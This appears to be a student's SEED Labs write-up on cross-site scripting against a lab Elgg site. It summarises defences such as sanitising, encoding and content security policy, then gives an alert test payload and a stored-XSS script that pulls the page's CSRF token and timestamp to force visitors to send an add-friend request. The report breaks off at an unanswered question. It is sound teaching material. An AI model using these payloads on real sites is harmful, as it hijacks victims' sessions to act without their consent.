# Background
## What is XSS attack?
![[Drawing 2023-11-20 15.57.56.excalidraw|650]]
## Countermeasures
1. Sanitize(Filter): The goal for this countermeasure is to remove the code from user's inputs. Usually, the malicious code are embedded with a script tag. Therefore, by deleting this tag, the malicious code can be treated as normal text. 
2. Encoding: Similar to the first method, we can use the ASCII characters to treat the tag brackets '<' and '>' as characters by encoding them. It can also make the malicious code be text. 
3. Content Security Policy: This is a method to control the script usage of the files. For example, we can only allow the website use the same source script. We can also restrict the inline script with nonces to prevent users from using unknown source scripts. 
# Task 1
## Results and Screenshots
Input: 
`<script>alert('xss')</script>` 
Output: 
![[Pasted image 20231120123001.png|650]]
## Explanation
For the website input, it has a "Edit HTML" button which allows the users to input the HTML tags directly without sanitizing them. Therefore, if we put script tags inside the input box, the website would run the code between the script tags. When we click the save button, it will also put everything into the database as the script tag, which means every user who access this page will automatically run the not sanitized code. 
# Task 2
Captured: 
`http://www.seed-server.com/action/friends/add? friend=59&__elgg_ts=1700483477&__elgg_token=Blz_SXdDF3os1joxJsVvyw&_ _elgg_ts=1700483477&__elgg_token=Blz_SXdDF3os1joxJsVvyw`
Script: 
```
<script type="text/javascript">
window.onload = function () {
var Ajax=null;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; var token="&__elgg_token="+elgg.security.token.__elgg_token;  
var sendurl= "http://www.seed-server.com/action/friends/add? friend=59"+ts+token+ts+token; 
Ajax=new XMLHttpRequest(); 
Ajax.open("GET", sendurl, true); 
Ajax.send(); 
}
</script>
```
Alice's account automatically sent the request: (When refresh, the button automatically changed from "Add Friend" to "Remove Friend")
![[Pasted image 20231120125238.png|650]]
## Questions
1. Question 1: Explain the purpose of (1) and (2), why are they needed? 
Answer: The website contains countermeasures regarding the CSRF attack. The token and the timestamp are used as a verification of user's status. Therefore, the two lines are used to directly extract the CSRF token and timestamp to the variable to use them easily. 
2. 